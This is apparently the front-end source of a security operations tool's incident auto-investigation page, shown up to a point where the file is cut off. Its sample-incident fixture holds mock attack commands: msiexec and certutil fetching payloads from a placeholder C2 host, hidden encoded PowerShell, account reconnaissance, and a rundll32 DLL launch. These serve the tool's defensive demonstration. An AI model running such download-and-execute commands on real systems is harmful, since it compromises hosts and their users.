/**
 * AutoInvestigatePage — Sprint 1 MVP flagship page.
 *
 * Analyst pastes a full incident from any source (CrowdStrike, Defender,
 * SentinelOne, Splunk, Sysmon …), presses AUTO INVESTIGATE, and gets a
 * structured FINAL INCIDENT SUMMARY back — no prompt engineering, no
 * per-command decoding step.
 *
 * All heavy lifting happens in POST /api/v2/auto-investigate (deterministic
 * orchestrator over the existing engine). This component is the shell.
 */
import { useCallback, useEffect, useRef, useState } from "react";
import React from "react";
import api, { API_BASE } from "@/lib/api";
import Header from "@/components/Header";

const SEVERITY_TONE = {
  Critical:      { bg: "#450a0a", fg: "#fecaca", border: "#7f1d1d" },
  High:          { bg: "#451a03", fg: "#fed7aa", border: "#7c2d12" },
  Medium:        { bg: "#422006", fg: "#fde68a", border: "#78350f" },
  Low:           { bg: "#083344", fg: "#a5f3fc", border: "#164e63" },
  Informational: { bg: "#052e16", fg: "#bbf7d0", border: "#14532d" },
};

const VERDICT_TONE = {
  malicious:    "text-red-300 border-red-500/40 bg-red-500/10",
  critical:     "text-red-200 border-red-500/60 bg-red-500/15",
  suspicious:   "text-amber-300 border-amber-500/40 bg-amber-500/10",
  needs_review: "text-sky-300 border-sky-500/40 bg-sky-500/10",
  benign:       "text-emerald-300 border-emerald-500/40 bg-emerald-500/10",
  unknown:      "text-slate-300 border-slate-500/40 bg-slate-500/10",
};

const SAMPLE_INCIDENT = `CrowdStrike Falcon Alert · High · Host: FIN-DC-01 · User: backup_EA
Detection time: 2026-07-22T13:04:54Z

Process tree:
  msiexec.exe /i http://malicious-c2.example.com/loader.msi
   └─ powershell.exe -NoP -W Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=
   └─ certutil -urlcache -f http://malicious-c2.example.com/loader.exe C:\\Users\\backup_EA\\AppData\\Local\\loader.exe
   └─ cmd.exe /c whoami && net user backup_EA /domain
   └─ rundll32.exe C:\\Windows\\Temp\\evil.dll,DllMain

C2 IP: 192.168.44.101
Domain: malicious-c2.example.com
SHA256: 4a67e9c22b0c5d7f8ab1c3d0e5b8a2f7d6c8e4a1b9d2f0e3c7a8b5d4e6f1a2c9
Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\backup_EA`;

export default function AutoInvestigatePage() {
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [result, setResult] = useState(null);
  const [focus, setFocus] = useState("");
  const [report, setReport] = useState(null);
  const [reportProfile, setReportProfile] = useState("soc_analyst");
  const [reportLoading, setReportLoading] = useState(false);
  // ─── P0.1 · Async / WebSocket streaming state ────────────────────
  const [useAsync, setUseAsync] = useState(true);
  const [progress, setProgress] = useState(null);   // { stage, percent, message, steps[], commands[], parseInfo, osint }
  const [jobId, setJobId] = useState(null);
  const wsRef = useRef(null);

  const closeWs = useCallback(() => {
    if (wsRef.current) {
      try { wsRef.current.close(); } catch { /* noop */ }
      wsRef.current = null;
    }
  }, []);

  useEffect(() => () => closeWs(), [closeWs]);

  const runInvestigationSync = useCallback(async () => {
    const r = await api.post("/v2/auto-investigate", {
      incident_text: input, focus: focus || null,
    });
    setResult(r.data);
  }, [input, focus]);

  const runInvestigationAsync = useCallback(async () => {
    closeWs();
    setProgress({
      stage: "queued", percent: 0, message: "Creating investigation job…",
      steps: [], commands: [], chains: [], parseInfo: null, osint: null,
    });
    // 1. Create job — backend spawns worker off the request loop.
    const create = await api.post("/v2/auto-investigate/jobs", {
      incident_text: input, focus: focus || null,
    });
    const { job_id: newJobId, ws_path } = create.data;
    setJobId(newJobId);

    // Helper: fold a WS/polled snapshot into progress state.
    const applyStreamEvent = (msg) => {
      setProgress(prev => {
        const p = { ...(prev || {}) };
        const t = msg.type;
        if (t === "progress") {
          p.stage = msg.stage; p.percent = msg.percent; p.message = msg.message;
          p.steps = [...(p.steps || []), { stage: msg.stage, percent: msg.percent, message: msg.message, ts: Date.now() }];
        } else if (t === "command") {
          p.commands = [...(p.commands || []), msg];
        } else if (t === "decode_chain") {
          p.chains = [...(p.chains || []), msg];
        } else if (t === "parse_result") {
          p.parseInfo = msg;
        } else if (t === "osint_result") {
          p.osint = msg;
        }
        return p;
      });
    };

    return new Promise((resolve, reject) => {
      let finalized = false;
      const finalize = (ok, payload) => {
        if (finalized) return;
        finalized = true;
        closeWs();
        if (ok) resolve(payload); else reject(payload);
      };

      // ─── (a) Best-effort WebSocket · instant updates if ingress supports WS upgrade ───
      try {
        const token = localStorage.getItem("nvx_token") || "";
        const backendUrl = process.env.REACT_APP_BACKEND_URL || "";
        const wsBase = backendUrl.replace(/^http/i, "ws");
        const wsUrl = `${wsBase}${ws_path}?token=${encodeURIComponent(token)}`;
        const ws = new WebSocket(wsUrl);
        wsRef.current = ws;
        ws.onmessage = (ev) => {
          let msg;
          try { msg = JSON.parse(ev.data); } catch { return; }
          applyStreamEvent(msg);
          if (msg.type === "result") setResult(msg.result);
          if (msg.type === "done") {
            if (msg.status === "complete") finalize(true, msg);
            else finalize(false, new Error(msg.error || "Investigation failed"));
          }
        };
        // If WS fails or closes early, we swallow the error — polling below
        // is the source of truth and will always terminate the promise.
        ws.onerror = () => { /* polling fallback covers this */ };
        ws.onclose = () => { /* polling fallback covers this */ };
      } catch { /* WebSocket unsupported / blocked — polling handles it */ }

      // ─── (b) HTTP polling · always-on safety net for prod ingress that blocks WS ───
      // Progress steps + decode statuses are persisted to Mongo on every
      // event, so a 1.5 s poll delivers the full experience even without
      // WebSocket. Backs off to 3 s after 60 s to reduce chatter on
      // slow-running jobs.
      let attempts = 0;
      const pollOnce = async () => {
        if (finalized) return;
        attempts += 1;
        try {
          const snap = (await api.get(`/v2/auto-investigate/jobs/${newJobId}`)).data;
          // Fold the DB snapshot into progress state without clobbering
          // richer data already delivered by WS.
          setProgress(prev => {
            const p = { ...(prev || {}) };
            const prog = snap.progress || {};
            if (prog.stage) p.stage = prog.stage;
            if (typeof prog.percent === "number") p.percent = prog.percent;
            if (prog.message) p.message = prog.message;
            const steps = prog.steps || [];
            if (steps.length > (p.steps?.length || 0)) p.steps = steps;
            const cmds = snap.decode_statuses || [];
            if (cmds.length > (p.commands?.length || 0)) {
              p.commands = cmds.map((s, i) => ({ ...s, index: s.index ?? i }));
            }
            // Chains only appear inside the final result — surface them
            // as soon as the result lands.
            const chains = snap?.result?.decode_pipeline?.chains || [];
            if (chains.length > (p.chains?.length || 0)) p.chains = chains;
            const rs = snap?.result?.decode_pipeline?.recursive_stats;
            if (rs && !p.osint?.matches && snap?.result?.final_incident_summary?.ioc_reputation?.summary) {
              const s = snap.result.final_incident_summary.ioc_reputation.summary;
              p.osint = { matches: s.matches, total_lookups: s.total_lookups,
                          sources: snap.result.final_incident_summary.ioc_reputation.sources || {} };
            }
            return p;
          });
          if (snap.result) setResult(snap.result);
          if (snap.status === "complete") return finalize(true, { status: "complete" });
          if (snap.status === "failed") return finalize(false, new Error(snap.error || "Investigation failed"));
        } catch (e) {
          // Transient network / auth hiccup — keep polling.
          console.warn("[auto-investigate] poll error:", e?.message || e);
        }
        const nextDelay = attempts > 40 ? 3000 : 1500;
        setTimeout(pollOnce, nextDelay);
      };
      // Give the WS a beat to open first (avoid duplicate first paint).
      setTimeout(pollOnce, 1200);
    });
  }, [input, focus, closeWs]);

  const runInvestigation = useCallback(async () => {
    if (!input.trim()) return;
    setLoading(true);
    setError("");
    setResult(null);
    setReport(null);
    try {
      if (useAsync) {
        await runInvestigationAsync();
      } else {
        setProgress(null);
        await runInvestigationSync();
      }
    } catch (e) {
      setError(e.friendlyMessage || e.response?.data?.detail || String(e.message || e));
    } finally {
      setLoading(false);
    }
  }, [input, useAsync, runInvestigationAsync, runInvestigationSync]);

  const downloadMarkdown = () => {
    if (!result) return;
    const md = renderMarkdown(result);
    const blob = new Blob([md], { type: "text/markdown" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "nivxray-final-incident-summary.md";
    a.click();
    URL.revokeObjectURL(url);
  };

  const downloadJson = () => {
    if (!result) return;
    const blob = new Blob([JSON.stringify(result, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "nivxray-final-incident-summary.json";
    a.click();
    URL.revokeObjectURL(url);
  };

  const generateEnterpriseReport = useCallback(async () => {
    if (!input.trim()) return;
    setReportLoading(true);
    try {
      const r = await api.post("/v2/report-writer/generate/from-model", {
        investigation: result, profile: reportProfile,
      });
      setReport(r.data.report);
    } catch (e) {
      setError(e.friendlyMessage || e.response?.data?.detail || String(e.message || e));
    } finally {
      setReportLoading(false);
    }
  }, [input, result, reportProfile]);

  const downloadReportMd = () => {
    if (!report) return;
    const md = renderReportMarkdown(report);
    const blob = new Blob([md], { type: "text/markdown" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `nivxray-enterprise-report-${report.profile}.md`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100">
      <Header />
      <div className="px-6 py-8">
        <div className="max-w-6xl mx-auto space-y-6">
          <header className="flex items-baseline justify-between" data-testid="auto-investigate-header">
            <div>
              <h1 className="text-2xl font-bold tracking-tight">
                <span className="text-cyan-400">⚡</span> AUTO INVESTIGATE
                <span className="text-slate-500 text-lg font-normal ml-2">v1 · Deterministic First</span>
              </h1>
              <p className="text-sm text-slate-400 mt-1">
                Paste an entire incident. NivXRay extracts, decodes, correlates, and produces a Final Incident Summary — no prompt engineering.
              </p>
            </div>
          </header>

          {/* Input card */}
          <section className="border border-slate-700/60 bg-slate-900/40 rounded-xl p-5"
                   data-testid="auto-investigate-input-card">
            <div className="flex items-center justify-between mb-3">
              <h2 className="text-base font-semibold">Incident input</h2>
              <div className="flex items-center gap-2 text-xs">
                <span className="text-slate-500">Sources:</span>
                <span className="text-slate-400">CrowdStrike · Defender · SentinelOne · Splunk · Sysmon · Cisco · Any text</span>
              </div>
            </div>
            <textarea
              className="w-full min-h-[220px] bg-slate-950/60 border border-slate-800 rounded-lg p-3 font-mono text-xs text-slate-100 placeholder:text-slate-600 focus:outline-none focus:ring-1 focus:ring-cyan-500"
              placeholder="Paste the raw incident here — alert JSON, EDR narrative, plain text, Sysmon logs…"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              disabled={loading}
              data-testid="auto-investigate-input"
            />
            <div className="mt-3 flex items-center gap-2 flex-wrap">
              <button
                onClick={runInvestigation}
                disabled={loading || !input.trim()}
                data-testid="auto-investigate-run-btn"
                className="px-4 py-2 text-sm rounded-lg bg-cyan-500/90 hover:bg-cyan-500 disabled:bg-slate-700 disabled:text-slate-500 text-slate-950 font-bold"
              >
                {loading ? "Investigating…" : "⚡ AUTO INVESTIGATE"}
              </button>
              <button
                onClick={() => setInput(SAMPLE_INCIDENT)}
                disabled={loading}
                data-testid="auto-investigate-sample-btn"
                className="px-3 py-2 text-sm rounded-lg border border-slate-700 text-slate-300 hover:bg-slate-800/60"
              >
                Load sample incident
              </button>
              <button
                onClick={() => { setInput(""); setResult(null); setError(""); }}
                disabled={loading}
                data-testid="auto-investigate-clear-btn"
                className="px-3 py-2 text-sm rounded-lg border border-slate-700 text-slate-400 hover:bg-slate-800/60"
              >
                Clear
              </button>
              <div className="flex items-center gap-1.5 text-xs ml-auto">
                <label className="flex items-center gap-1.5 mr-3 select-none cursor-pointer"
                       data-testid="async-toggle-label">
                  <input type="checkbox" checked={useAsync}
                         onChange={(e) => setUseAsync(e.target.checked)}
                         disabled={loading}
                         data-testid="async-toggle"
                         className="accent-cyan-500" />
                  <span className="text-slate-400">Live stream</span>
                </label>
                <span className="text-slate-500">Focus:</span>
                {["", "persistence", "c2", "credential-access", "powershell"].map(f => (
                  <button key={f || "any"}
                          data-testid={`focus-${f || "any"}`}
                          onClick={() => setFocus(f)}
                          className={`px-2 py-1 rounded-full text-[10px] font-mono border ${
                            focus === f ? "bg-cyan-500/20 border-cyan-500/60 text-cyan-200"
                                        : "border-slate-700 text-slate-400 hover:bg-slate-800/50"
                          }`}>
                    {f || "any"}
                  </button>
                ))}
              </div>
            </div>
            {error && (
              <div className="mt-3 text-sm text-red-400" data-testid="auto-investigate-error">{error}</div>
            )}
          </section>

          {loading && useAsync && progress && (
            <LiveProgress progress={progress} jobId={jobId} />
          )}

          {loading && !useAsync && (
            <div className="animate-pulse space-y-3">
              <div className="h-24 bg-slate-800/40 rounded-xl" />
              <div className="h-40 bg-slate-800/40 rounded-xl" />
              <div className="h-32 bg-slate-800/40 rounded-xl" />
            </div>
          )}

          {/* MDR INVESTIGATION — analyst-facing narrative + timeline + escalation */}
          {result?.mdr_investigation && <MdrInvestigation mdr={result.mdr_investigation} />}
          {result && <FinalIncidentSummary result={result} onExportMd={downloadMarkdown} onExportJson={downloadJson} />}

          {/* P0.3 · Recursive Decode Tree + Statistics — always shown after a completed investigation */}
          {result && (
            <DecodeTreeSection
              chains={result?.decode_pipeline?.chains || []}
              stats={result?.decode_pipeline?.recursive_stats}
            />
          )}

          {/* Enterprise Report Writer trigger */}
          {result && !report && (
            <section className="border border-cyan-500/40 bg-cyan-500/5 rounded-xl p-5"
                     data-testid="report-writer-cta">
              <div className="flex flex-wrap items-center gap-3">
                <div className="flex-1 min-w-[320px]">
                  <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300 mb-1">
                    ENTERPRISE REPORT WRITER
                  </div>
                  <h3 className="text-lg font-bold text-slate-100">Generate MDR-grade investigation report</h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Transforms this verified investigation into a 17-section customer-ready document. Deterministic — the report writer never re-investigates or infers new facts.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <div className="flex items-center rounded-lg border border-slate-700 overflow-hidden" data-testid="report-profile-tabs">
                    {["executive", "customer", "soc_analyst", "technical"].map(p => (
                      <button key={p}
                              data-testid={`report-profile-${p}`}
                              onClick={() => setReportProfile(p)}
                              className={`px-3 py-1.5 text-[11px] font-semibold ${
                                reportProfile === p ? "bg-cyan-500 text-slate-950" : "text-slate-300"
                              }`}>
                        {p.replace("_", " ")}
                      </button>
                    ))}
                  </div>
                  <button onClick={generateEnterpriseReport}
                          data-testid="generate-report-btn"
                          disabled={reportLoading}
                          className="px-4 py-2 text-sm rounded-lg bg-cyan-500/90 hover:bg-cyan-500 disabled:bg-slate-700 text-slate-950 font-bold">
                    {reportLoading ? "Writing…" : "Generate Report"}
                  </button>
                </div>
              </div>
            </section>
          )}

          {report && <EnterpriseReport report={report}
                                       onExportMd={downloadReportMd}
                                       onProfileChange={(p) => { setReportProfile(p); setReport(null); }}
                                       onClose={() => setReport(null)} />}
        </div>
      </div>
    </div>
  );
}

// ─── Enterprise Report renderer (17 sections) ───────────────────
function EnterpriseReport({ report, onExportMd, onClose, onProfileChange }) {
  const s = report.sections || {};
  const ov = s["02_incident_overview"] || {};
  const rc = s["06_root_cause"] || {};
  const fv = s["16_final_verdict"] || {};
  const bi = s["13_business_impact"] || {};
  const ti = s["11_threat_intelligence"] || {};
  const ca = s["14_customer_actions"] || {};
  return (
    <article className="border border-slate-700/70 rounded-xl p-6 space-y-6"
             data-testid="enterprise-report"
             style={{ background: "linear-gradient(180deg, #0b1522 0%, #050c17 100%)" }}>
      {/* Report header */}
      <header className="flex flex-wrap items-start justify-between gap-3 pb-4 border-b border-slate-800">
        <div>
          <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300">
            NIVXRAY · ENTERPRISE INVESTIGATION REPORT
          </div>
          <h2 className="text-2xl font-bold mt-1" data-testid="report-incident-number">
            {ov.incident_number}
          </h2>
          <div className="text-xs text-slate-400 mt-1 font-mono">
            <span data-testid="report-source">{ov.detection_source}</span> · host <span className="text-slate-200">{ov.hostname}</span> · user <span className="text-slate-200">{ov.username}</span> · OS {ov.operating_system} · {ov.investigation_status}
          </div>
          {report.customer && (
            <div className="mt-1 text-xs text-slate-400">Customer: <span className="text-slate-200">{report.customer}</span></div>
          )}
        </div>
        <div className="flex items-center gap-2">
          <span className="px-3 py-1 rounded-full text-[10px] uppercase tracking-widest font-bold border border-cyan-500/60 text-cyan-200 bg-cyan-500/10">
            Audience · {report.profile}
          </span>
          <button onClick={onExportMd} data-testid="report-export-md"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-200 hover:bg-slate-800/60">
            Download Markdown
          </button>
          <button onClick={onClose} data-testid="report-close"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-400 hover:bg-slate-800/60">
            Close
          </button>
        </div>
      </header>

      {/* Section 1 — Executive Summary */}
      <ReportSection num={1} title="Executive Summary" testid="section-exec">
        <div className="space-y-2 text-sm text-slate-200 leading-relaxed">
          {(s["01_executive_summary"] || []).map((p, i) => (
            <p key={i} dangerouslySetInnerHTML={{ __html: markdownInline(p) }} />
          ))}
        </div>
      </ReportSection>

      {/* Section 3 — Narrative */}
      <ReportSection num={3} title="Investigation Narrative" testid="section-narrative">
        <div className="text-sm text-slate-200 leading-relaxed whitespace-pre-line"
             dangerouslySetInnerHTML={{ __html: markdownInline(s["03_investigation_narrative"] || "") }} />
      </ReportSection>

      {/* Section 4 — Timeline */}
      <ReportSection num={4} title="Detection Timeline" testid="section-timeline">
        <ol className="space-y-2 text-sm">
          {(s["04_detection_timeline"] || []).map((ev, i) => (
            <li key={i} className="border-l-2 border-cyan-500/40 pl-3">
              <div className="font-mono text-xs text-cyan-300">{ev.time}</div>
              <div className="text-slate-200">{ev.event}</div>
              <div className="text-[10px] font-mono text-slate-500 mt-0.5">{ev.evidence_type}</div>
            </li>
          ))}
        </ol>
      </ReportSection>

      {/* Section 5 — Attack Story */}
      <ReportSection num={5} title="Attack Story" testid="section-attack-story">
        <ol className="space-y-1.5 text-sm text-slate-200 list-decimal pl-5">
          {(s["05_attack_story"] || []).map((beat, i) => <li key={i}>{beat}</li>)}
        </ol>
      </ReportSection>

      {/* Section 6 — Root Cause */}
      <ReportSection num={6} title="Root Cause Analysis" testid="section-root-cause">
        <div className="p-4 rounded-lg border border-amber-500/30 bg-amber-500/5">
          <div className="text-sm text-slate-100 font-semibold" data-testid="root-cause-finding">
            {rc.finding}
          </div>
          <TraceRow record={rc} />
        </div>
      </ReportSection>

      {/* Section 7 — Behaviours */}
      <ReportSection num={7} title="Malware Behaviour" testid="section-behaviour">
        <div className="grid md:grid-cols-2 gap-3">
          {Object.entries(s["07_malware_behaviour"] || {}).map(([tactic, techs]) => (
            <div key={tactic} className="border border-slate-800 rounded p-3 bg-slate-950/50">
              <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{tactic.toUpperCase()}</div>
              <ul className="text-xs text-slate-200 space-y-1 font-mono">
                {techs.map((t, i) => <li key={i}>{t}</li>)}
              </ul>
            </div>
          ))}
        </div>
      </ReportSection>

      {/* Section 8 — Findings */}
      <ReportSection num={8} title="Investigation Findings" testid="section-findings">
        <ul className="space-y-2.5">
          {(s["08_findings"] || []).map((f, i) => (
            <li key={i} className="border-l-2 border-cyan-500/40 pl-3">
              <div className="text-sm text-slate-100">{f.finding}</div>
              <TraceRow record={f} />
            </li>
          ))}
        </ul>
      </ReportSection>

      {/* Section 9 — Supporting Evidence */}
      <ReportSection num={9} title="Supporting Evidence" testid="section-evidence">
        <div className="grid md:grid-cols-2 gap-3">
          {Object.entries(s["09_supporting_evidence"] || {}).map(([cat, d]) => (
            <div key={cat} className="border border-slate-800 rounded p-3 bg-slate-950/50">
              <div className="flex items-baseline justify-between mb-1">
                <div className="text-[11px] font-bold text-slate-300 uppercase tracking-widest">{cat}</div>
                <div className="text-[10px] font-mono text-cyan-300">{d.count}</div>
              </div>
              <div className="text-[11px] text-slate-400 mb-2">{d.rationale}</div>
              <ul className="text-[11px] font-mono text-slate-200 break-all space-y-0.5">
                {(d.samples || []).map((x, i) => <li key={i}>{x}</li>)}
              </ul>
            </div>
          ))}
        </div>
      </ReportSection>

      {/* Section 10 — Environmental */}
      {(s["10_environmental"] || []).length > 0 && (
        <ReportSection num={10} title="Environmental Findings" testid="section-environmental">
          <ul className="space-y-2">
            {s["10_environmental"].map((e, i) => (
              <li key={i} className="border-l-2 border-slate-700 pl-3">
                <div className="text-sm text-slate-100">{e.finding}</div>
                <TraceRow record={e} />
              </li>
            ))}
          </ul>
        </ReportSection>
      )}

      {/* Section 11 — Threat Intel */}
      <ReportSection num={11} title="Threat Intelligence" testid="section-ti">
        <div className="grid md:grid-cols-2 gap-3">
          <TIColumn label="Observed" data={ti.observed || {}} />
          <TIColumn label="Correlated" data={ti.correlated || {}} />
        </div>
      </ReportSection>

      {/* Section 12 — Assets */}
      <ReportSection num={12} title="Affected Assets" testid="section-assets">
        <AssetRows assets={s["12_affected_assets"] || {}} />
      </ReportSection>

      {/* Section 13 — Business Impact */}
      <ReportSection num={13} title="Business Impact" testid="section-business">
        <div className="grid grid-cols-2 md:grid-cols-3 gap-3 text-sm">
          {Object.entries(bi).map(([k, v]) => (
            <div key={k} className="border border-slate-800 rounded p-2.5 bg-slate-950/60">
              <div className="text-[10px] text-slate-500 uppercase tracking-wide">{k.replace(/_/g, " ")}</div>
              <div className={`font-bold ${v === "High" ? "text-red-300" : v === "Medium" ? "text-amber-300" : "text-emerald-300"}`}>{v}</div>
            </div>
          ))}
        </div>
      </ReportSection>

      {/* Section 14 — Customer Actions */}
      <ReportSection num={14} title="Customer Actions" testid="section-actions">
        <div className="grid md:grid-cols-3 gap-3">
          {["immediate", "short_term", "long_term"].map(tier => (
            <div key={tier} className="border border-slate-800 rounded p-3 bg-slate-950/50">
              <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">
                {tier.replace("_", " ").toUpperCase()}
              </div>
              <ul className="space-y-1.5 text-sm text-slate-200 list-disc pl-4">
                {(ca[tier] || []).map((a, i) => <li key={i}>{a}</li>)}
              </ul>
            </div>
          ))}
        </div>
      </ReportSection>

      {/* Section 15 — Recommendations */}
      <ReportSection num={15} title="Recommendations" testid="section-recs">
        <ol className="space-y-2 text-sm">
          {(s["15_recommendations"] || []).map((r, i) => (
            <li key={i} className="border-l-2 border-cyan-500/40 pl-3">
              <div className="flex items-baseline gap-2">
                <span className={`text-[10px] uppercase tracking-wide px-2 py-0.5 rounded-full border ${
                  r.priority === "critical" ? "border-red-500/60 text-red-300" :
                  r.priority === "high"     ? "border-amber-500/60 text-amber-300" :
                                              "border-sky-500/60 text-sky-300"
                }`}>{r.priority}</span>
                <span className="text-slate-100 font-medium">{r.action}</span>
              </div>
              {r.rationale && <div className="text-xs text-slate-400 mt-1">{r.rationale}</div>}
            </li>
          ))}
        </ol>
      </ReportSection>

      {/* Section 16 — Final verdict */}
      <ReportSection num={16} title="Final Verdict" testid="section-verdict">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm">
          <VerdictCell label="Verdict"    value={fv.verdict} />
          <VerdictCell label="Severity"   value={fv.severity} />
          <VerdictCell label="Containment" value={fv.current_containment} />
          <VerdictCell label="Confidence" value={`${fv.confidence?.score ?? 0}%`} />
        </div>
        <p className="mt-3 text-sm text-slate-300">Remaining risk: <span className="text-slate-100">{fv.remaining_risk}</span></p>
      </ReportSection>

      {/* Meta footer */}
      <footer className="pt-4 border-t border-slate-800 text-[10px] text-slate-500 font-mono">
        Generated {report.generated_at_utc} · {report.meta?.engine} · deterministic · every conclusion is evidence-traceable
      </footer>
    </article>
  );
}

function ReportSection({ num, title, testid, children }) {
  return (
    <section data-testid={testid}>
      <h3 className="text-xs uppercase tracking-widest text-slate-400 font-bold mb-3">
        <span className="text-cyan-400 mr-2">{String(num).padStart(2, "0")}</span>{title}
      </h3>
      {children}
    </section>
  );
}

function TraceRow({ record }) {
  if (!record?.evidence_source) return null;
  return (
    <div className="mt-1 text-[10px] font-mono text-slate-500 flex flex-wrap gap-x-3">
      <span>Source: <span className="text-slate-300">{record.evidence_source}</span></span>
      <span>Type: <span className={record.evidence_type === "Correlated" ? "text-sky-300" : "text-emerald-300"}>{record.evidence_type}</span></span>
      <span>Confidence: <span className="text-slate-300">{record.confidence}</span></span>
    </div>
  );
}

function TIColumn({ label, data }) {
  return (
    <div className="border border-slate-800 rounded p-3 bg-slate-950/60">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{label.toUpperCase()}</div>
      <ul className="text-xs space-y-1">
        {Object.entries(data).map(([k, v]) => (
          <li key={k} className="flex justify-between gap-2">
            <span className="text-slate-400">{k.replace(/_/g, " ")}</span>
            <span className="text-slate-100 font-mono text-right break-all">
              {Array.isArray(v) ? (v.length ? `${v.length} · ${v.slice(0,2).join(", ")}${v.length > 2 ? "…" : ""}` : "—") :
               typeof v === "boolean" ? (v ? "yes" : "no") :
               v == null ? "—" : String(v)}
            </span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function AssetRows({ assets }) {
  const rows = [
    ["Primary host", assets.primary_host],
    ["Additional hosts", (assets.additional_hosts || []).join(", ") || "—"],
    ["Users", (assets.users || []).join(", ") || "—"],
    ["Network destinations", (assets.network_destinations || []).join(", ") || "—"],
    ["Affected files", (assets.affected_files || []).join(", ") || "—"],
    ["Registry locations", (assets.registry_locations || []).join(", ") || "—"],
  ];
  return (
    <ul className="text-xs space-y-1.5">
      {rows.map(([k, v]) => (
        <li key={k} className="flex justify-between gap-3 border-b border-slate-900 pb-1">
          <span className="text-slate-400 font-mono">{k}</span>
          <span className="text-slate-100 font-mono text-right break-all max-w-[70%]">{v}</span>
        </li>
      ))}
    </ul>
  );
}

function VerdictCell({ label, value }) {
  return (
    <div className="border border-slate-800 rounded p-3 bg-slate-950/60 text-center">
      <div className="text-[10px] text-slate-500 uppercase tracking-widest">{label}</div>
      <div className="text-lg font-bold text-slate-100 mt-1">{value || "—"}</div>
    </div>
  );
}

function renderReportMarkdown(report) {
  // Small local markdown export mirrors the backend one; used for
  // faster client-side downloads (backend also exposes /generate/markdown).
  const s = report.sections || {};
  const ov = s["02_incident_overview"] || {};
  const L = [];
  L.push(`# NivXRay Investigation Report · ${ov.incident_number || ""}`);
  L.push("");
  L.push(`**Source:** ${ov.detection_source} · **Host:** ${ov.hostname} · **User:** ${ov.username} · **OS:** ${ov.operating_system} · **Severity:** ${ov.severity}`);
  L.push("");
  L.push("## 1 · Executive Summary");
  (s["01_executive_summary"] || []).forEach(p => { L.push(p); L.push(""); });
  L.push("## 3 · Investigation Narrative");
  L.push(s["03_investigation_narrative"] || "");
  L.push("");
  L.push("## 4 · Detection Timeline");
  (s["04_detection_timeline"] || []).forEach(e => L.push(`- \`${e.time}\` — ${e.event} (${e.evidence_type})`));
  L.push("");
  L.push("## 5 · Attack Story");
  (s["05_attack_story"] || []).forEach((b, i) => L.push(`${i + 1}. ${b}`));
  L.push("");
  L.push("## 6 · Root Cause");
  const rc = s["06_root_cause"] || {};
  L.push(`**${rc.finding}**   _${rc.evidence_source} · ${rc.evidence_type} · ${rc.confidence}_`);
  L.push("");
  L.push("## 8 · Findings");
  (s["08_findings"] || []).forEach(f => L.push(`- ${f.finding}   _${f.evidence_source} · ${f.evidence_type} · ${f.confidence}_`));
  L.push("");
  L.push("## 15 · Recommendations");
  (s["15_recommendations"] || []).forEach(r => L.push(`- **[${r.priority}]** ${r.action} — ${r.rationale}`));
  L.push("");
  const fv = s["16_final_verdict"] || {};
  L.push("## 16 · Final Verdict");
  L.push(`- Verdict: **${fv.verdict}** · Severity: **${fv.severity}** · Containment: **${fv.current_containment}**`);
  L.push(`- Remaining risk: ${fv.remaining_risk}`);
  L.push("");
  L.push(`_Generated ${report.generated_at_utc} · ${report.meta?.engine} · audience: ${report.profile}_`);
  return L.join("\n");
}

// ─── FINAL INCIDENT SUMMARY panel ────────────────────────────────
function FinalIncidentSummary({ result, onExportMd, onExportJson }) {
  const fis = result.final_incident_summary || {};
  const det = result.detected || {};
  const sevTone = SEVERITY_TONE[fis.severity] || SEVERITY_TONE.Low;
  const verdictTone = VERDICT_TONE[fis.verdict] || VERDICT_TONE.unknown;
  return (
    <section className="space-y-5" data-testid="final-incident-summary">
      {/* Verdict + severity + confidence header */}
      <div className="flex flex-wrap items-center gap-3 border border-slate-700/60 bg-slate-900/40 rounded-xl p-4">
        <span className="text-[10px] tracking-[0.24em] font-bold text-slate-500">FINAL INCIDENT SUMMARY</span>
        <span className={`px-3 py-1 rounded-full text-xs font-bold uppercase border ${verdictTone}`}
              data-testid="fis-verdict">{fis.verdict}</span>
        <span className="px-3 py-1 rounded-full text-xs font-bold border"
              data-testid="fis-severity"
              style={{ background: sevTone.bg, color: sevTone.fg, borderColor: sevTone.border }}>
          {fis.severity}
        </span>
        <span className="px-3 py-1 rounded-full text-xs border border-slate-700 text-slate-300"
              data-testid="fis-confidence">
          Confidence {fis.confidence?.score ?? 0}%
        </span>
        <span className="text-xs text-slate-400 truncate max-w-[40ch]" title={fis.classification}
              data-testid="fis-classification">
          · {fis.classification}
        </span>
        <div className="ml-auto flex items-center gap-2">
          <button onClick={onExportMd} data-testid="fis-export-md"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-200 hover:bg-slate-800/60">
            Download · Markdown
          </button>
          <button onClick={onExportJson} data-testid="fis-export-json"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-200 hover:bg-slate-800/60">
            Download · JSON
          </button>
        </div>
      </div>

      <Section title="Executive Summary" testid="fis-executive">
        <div className="space-y-2 text-sm text-slate-200 leading-relaxed">
          {(fis.executive_summary || []).map((p, i) => (
            <p key={i} dangerouslySetInnerHTML={{ __html: markdownInline(p) }} />
          ))}
        </div>
      </Section>

